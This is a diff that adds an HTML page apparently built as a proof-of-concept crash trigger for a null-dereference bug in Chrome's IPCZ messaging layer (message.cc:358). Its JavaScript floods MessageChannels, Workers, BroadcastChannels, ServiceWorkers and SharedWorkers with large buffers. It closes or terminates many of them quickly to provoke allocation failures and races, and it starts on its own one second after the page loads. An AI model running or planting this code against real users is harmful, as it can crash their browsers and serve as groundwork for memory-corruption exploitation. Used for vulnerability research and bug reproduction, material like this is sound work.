@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IPCZ Bug Trigger - No OOM</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Consolas', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 20px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 { color: #ff7b72; margin-bottom: 15px; }
+        #status {
+            background: #161b22;
+            border: 2px solid #f0883e;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        #status.crash { border-color: #ff7b72; background: #2a1515; }
+        #status.complete { border-color: #3fb950; background: #0f2a15; }
+        #log {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 10px;
+            height: 400px;
+            overflow-y: auto;
+            font-size: 11px;
+        }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid #21262d; }
+        .error { color: #ff7b72; }
+        .warn { color: #f0883e; }
+        .success { color: #3fb950; }
+        .metrics {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .metric {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 10px;
+            text-align: center;
+        }
+        .metric-value { font-size: 20px; font-weight: bold; color: #58a6ff; }
+        .metric-label { font-size: 11px; color: #8b949e; }
+        button {
+            background: #238636;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+        button:disabled { background: #30363d; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔬 IPCZ malloc() Null Dereference Trigger</h1>
+        <p style="color:#8b949e;margin-bottom:15px">
+            Target: <code>message.cc:358</code> | No OOM, Pure IPC Stress
+        </p>
+        
+        <div id="status"><strong>Status:</strong> <span id="status-text">Ready</span></div>
+        
+        <div class="metrics">
+            <div class="metric">
+                <div class="metric-value" id="m-msg">0</div>
+                <div class="metric-label">Messages</div>
+            </div>
+            <div class="metric">
+                <div class="metric-value" id="m-ch">0</div>
+                <div class="metric-label">Channels</div>
+            </div>
+            <div class="metric">
+                <div class="metric-value" id="m-wk">0</div>
+                <div class="metric-label">Workers</div>
+            </div>
+            <div class="metric">
+                <div class="metric-value" id="m-iter">0</div>
+                <div class="metric-label">Iterations</div>
+            </div>
+        </div>
+        
+        <div style="margin-bottom:15px">
+            <button id="btn-start" onclick="start()">▶ START</button>
+            <button id="btn-stop" onclick="stop()" disabled>⏹ STOP</button>
+            <button onclick="clearLog()">🗑 Clear</button>
+        </div>
+        
+        <div id="log"></div>
+    </div>
+
+    <script>
+    const log = document.getElementById('log');
+    const statusDiv = document.getElementById('status');
+    const statusText = document.getElementById('status-text');
+    
+    let running = false;
+    let interval = null;
+    let msgCount = 0, chCount = 0, wkCount = 0, iterations = 0;
+    const channels = [], workers = [];
+    
+    function addLog(msg, type = '') {
+        const e = document.createElement('div');
+        e.className = `log-entry ${type}`;
+        e.textContent = `[${new Date().toISOString().substr(14,8)}] ${msg}`;
+        log.appendChild(e);
+        log.scrollTop = log.scrollHeight;
+    }
+    
+    function updateMetrics() {
+        document.getElementById('m-msg').textContent = msgCount.toLocaleString();
+        document.getElementById('m-ch').textContent = chCount;
+        document.getElementById('m-wk').textContent = wkCount;
+        document.getElementById('m-iter').textContent = iterations;
+    }
+    
+    function setStatus(text, cls) {
+        statusDiv.className = cls || '';
+        statusText.textContent = text;
+    }
+    
+    function clearLog() { log.innerHTML = ''; addLog('Log cleared'); }
+    
+    // ========================================================================
+    // KEY INSIGHT: Bug triggers on PER-MESSAGE malloc failure
+    // NOT system OOM. So we need MANY messages, not HUGE messages.
+    // ========================================================================
+    
+    // ========================================================================
+    // VECTOR 1: MessageChannel - Many small/medium messages
+    // Buffer size: 256KB - 2MB (not 50MB!)
+    // ========================================================================
+    
+    function messageChannelFlood() {
+        const batchSize = 200;  // More messages, smaller size
+        
+        for (let i = 0; i < batchSize; i++) {
+            try {
+                const ch = new MessageChannel();
+                channels.push(ch);
+                
+                // 2MB buffer - enough to stress allocator, not cause OOM
+                const bufSize = 2 * 1024 * 1024;
+                const buf = new ArrayBuffer(bufSize);
+                
+                ch.port1.postMessage({ 
+                    id: msgCount++, 
+                    buffer: buf,
+                    timestamp: Date.now()
+                }, [buf]);
+                
+                // Close 40% immediately to create race condition
+                if (i % 5 < 2) {
+                    setTimeout(() => {
+                        try {
+                            ch.port1.close();
+                            ch.port2.close();
+                        } catch(e) {}
+                    }, Math.random() * 50);
+                }
+                
+                ch.port2.onmessage = (e) => {
+                    try {
+                        ch.port1.postMessage({ 
+                            echoed: true, 
+                            id: e.data?.id,
+                            buffer: new ArrayBuffer(1024 * 1024)
+                        });
+                        msgCount++;
+                    } catch(err) {}
+                };
+                
+            } catch(e) {
+                // Expected when allocator stressed
+                addLog(`MC alloc failed: ${e.message}`, 'warn');
+            }
+        }
+        chCount = channels.length;
+        updateMetrics();
+    }
+    
+    // ========================================================================
+    // VECTOR 2: Worker Storm - Create/destroy rapidly
+    // ========================================================================
+    
+    function workerStorm() {
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data.action === 'echo') {
+                    const buf = new ArrayBuffer(e.data.size || 512 * 1024);
+                    self.postMessage({ 
+                        echoed: true, 
+                        buffer: buf,
+                        id: e.data.id 
+                    }, [buf]);
+                }
+                if (e.data.action === 'flood') {
+                    for (let i = 0; i < 20; i++) {
+                        self.postMessage({
+                            seq: i,
+                            buffer: new ArrayBuffer(256 * 1024)
+                        });
+                    }
+                }
+            };
+        `;
+        
+        const batchSize = 50;
+        
+        for (let i = 0; i < batchSize; i++) {
+            try {
+                const blob = new Blob([workerCode], {type:'text/javascript'});
+                const w = new Worker(URL.createObjectURL(blob));
+                workers.push(w);
+                
+                w.onmessage = (e) => {
+                    if (e.data.echoed) {
+                        try {
+                            w.postMessage({ 
+                                action: 'echo', 
+                                size: 1024 * 1024,
+                                id: msgCount++
+                            });
+                        } catch(err) {}
+                    }
+                };
+                
+                // Initial message
+                w.postMessage({ 
+                    action: 'echo', 
+                    size: 2 * 1024 * 1024,
+                    id: msgCount++
+                });
+                
+                // Terminate 50% rapidly to create cleanup race
+                if (i % 2 === 0) {
+                    setTimeout(() => { 
+                        try { w.terminate(); } catch(e) {} 
+                    }, 10 + Math.random() * 100);
+                }
+                
+            } catch(e) {
+                addLog(`Worker alloc failed: ${e.message}`, 'warn');
+            }
+        }
+        wkCount = workers.length;
+        updateMetrics();
+    }
+    
+    // ========================================================================
+    // VECTOR 3: BroadcastChannel - High volume
+    // ========================================================================
+    
+    function broadcastStorm() {
+        const names = ['ipc-a','ipc-b','ipc-c','ipc-d','ipc-e'];
+        
+        names.forEach(name => {
+            try {
+                const bc = new BroadcastChannel(name);
+                channels.push(bc);
+                
+                bc.onmessage = (e) => {
+                    if (e.data?.forward) {
+                        try {
+                            bc.postMessage({
+                                forwarded: true,
+                                buffer: new ArrayBuffer(512 * 1024),
+                                ts: Date.now()
+                            });
+                            msgCount++;
+                        } catch(err) {}
+                    }
+                };
+                
+                // Send many small messages
+                for (let i = 0; i < 50; i++) {
+                    bc.postMessage({
+                        forward: true,
+                        id: msgCount++,
+                        buffer: new ArrayBuffer(256 * 1024)
+                    });
+                }
+                
+            } catch(e) {
+                addLog(`BC failed: ${e.message}`, 'warn');
+            }
+        });
+        
+        chCount = channels.length;
+        updateMetrics();
+    }
+    
+    // ========================================================================
+    // VECTOR 4: ServiceWorker - Register/unregister cycle
+    // ========================================================================
+    
+    async function serviceWorkerCycle() {
+        const swCode = `
+            self.addEventListener('message', async (e) => {
+                const clients = await self.clients.matchAll();
+                clients.forEach(c => {
+                    try {
+                        c.postMessage({
+                            buffer: new ArrayBuffer(1024 * 1024),
+                            ts: Date.now()
+                        });
+                    } catch(err) {}
+                });
+            });
+            self.addEventListener('activate', ev => ev.waitUntil(self.clients.claim()));
+        `;
+        
+        for (let round = 0; round < 10; round++) {
+            try {
+                const blob = new Blob([swCode], {type:'text/javascript'});
+                const url = URL.createObjectURL(blob);
+                const reg = await navigator.serviceWorker.register(url, {scope: `/test-${round}/`});
+                await navigator.serviceWorker.ready;
+                
+                const client = reg.active;
+                if (client) {
+                    client.postMessage({ action: 'stress', id: msgCount++ });
+                    msgCount += 5;
+                }
+                
+                // Unregister half of them
+                if (round % 2 === 0) {
+                    await reg.unregister();
+                }
+                
+            } catch(e) {
+                addLog(`SW failed: ${e.message}`, 'warn');
+            }
+            
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
+    
+    // ========================================================================
+    // VECTOR 5: SharedWorker + Port messaging
+    // ========================================================================
+    
+    function sharedWorkerFlood() {
+        const swCode = `
+            const ports = [];
+            self.onconnect = function(e) {
+                const port = e.ports[0];
+                ports.push(port);
+                port.onmessage = function(ev) {
+                    if (ev.data.action === 'echo') {
+                        port.postMessage({
+                            echoed: true,
+                            buffer: new ArrayBuffer(ev.data.size || 256 * 1024)
+                        });
+                    }
+                };
+                port.start();
+            };
+        `;
+        
+        for (let i = 0; i < 30; i++) {
+            try {
+                const blob = new Blob([swCode], {type:'text/javascript'});
+                const w = new SharedWorker(URL.createObjectURL(blob), `shared-${i % 3}`);
+                workers.push(w);
+                
+                w.port.start();
+                w.port.onmessage = (e) => {
+                    if (e.data.echoed) {
+                        try {
+                            w.port.postMessage({ 
+                                action: 'echo', 
+                                size: 512 * 1024 
+                            });
+                            msgCount++;
+                        } catch(err) {}
+                    }
+                };
+                
+                w.port.postMessage({ 
+                    action: 'echo', 
+                    size: 1024 * 1024,
+                    id: msgCount++
+                });
+                
+            } catch(e) {
+                addLog(`SharedWorker failed: ${e.message}`, 'warn');
+            }
+        }
+        
+        wkCount = workers.length;
+        updateMetrics();
+    }
+    
+    // ========================================================================
+    // MAIN LOOP - Balanced for bug trigger without OOM
+    // ========================================================================
+    
+    function runIteration() {
+        if (!running) return;
+        
+        iterations++;
+        
+        // All vectors
+        messageChannelFlood();
+        workerStorm();
+        broadcastStorm();
+        serviceWorkerCycle();
+        sharedWorkerFlood();
+        
+        // Cleanup to prevent browser freeze (but keep enough for stress)
+        if (channels.length > 500) {
+            const toRemove = channels.splice(0, 250);
+            toRemove.forEach(ch => {
+                try { 
+                    if(ch.close) ch.close(); 
+                    if(ch.port1) ch.port1.close(); 
+                    if(ch.port2) ch.port2.close(); 
+                } catch(e){}
+            });
+            chCount = channels.length;
+        }
+        
+        if (workers.length > 200) {
+            const toRemove = workers.splice(0, 100);
+            toRemove.forEach(w => {
+                try { w.terminate(); } catch(e){}
+            });
+            wkCount = workers.length;
+        }
+        
+        updateMetrics();
+        
+        // Log progress
+        if (iterations % 5 === 0) {
+            addLog(`Iter ${iterations} - Msg:${msgCount} Ch:${chCount} Wk:${wkCount}`, 'success');
+        }
+        
+        // Stop after reasonable time (bug should trigger by now)
+        if (iterations >= 100) {
+            addLog('100 iterations complete - bug should have triggered', 'warn');
+            stop();
+        }
+    }
+    
+    function start() {
+        if (running) return;
+        running = true;
+        document.getElementById('btn-start').disabled = true;
+        document.getElementById('btn-stop').disabled = false;
+        setStatus('RUNNING - Monitor for crash (check Task Manager)', 'running');
+        
+        addLog('========================================', 'info');
+        addLog('IPCZ Bug Trigger Started', 'info');
+        addLog(`Chrome: ${navigator.userAgent.substring(0,60)}...`, 'info');
+        addLog('Strategy: High IPC volume, moderate buffer sizes', 'info');
+        addLog('========================================', 'info');
+        
+        // Initial burst
+        runIteration();
+        
+        // Continue every 100ms (faster than before, but smaller payloads)
+        interval = setInterval(runIteration, 100);
+    }
+    
+    function stop() {
+        running = false;
+        document.getElementById('btn-start').disabled = false;
+        document.getElementById('btn-stop').disabled = true;
+        setStatus('STOPPED', 'complete');
+        
+        if (interval) { clearInterval(interval); interval = null; }
+        
+        addLog('========================================', 'warn');
+        addLog(`Stopped - Total: ${msgCount} msgs, ${iterations} iterations`, 'warn');
+        addLog('========================================', 'warn');
+    }
+    
+    // Auto-start
+    window.addEventListener('load', () => {
+        addLog('Page loaded - auto-start in 1 second...', 'info');
+        setTimeout(() => { if(!running) start(); }, 1000);
+    });
+    </script>
+</body>
+</html>
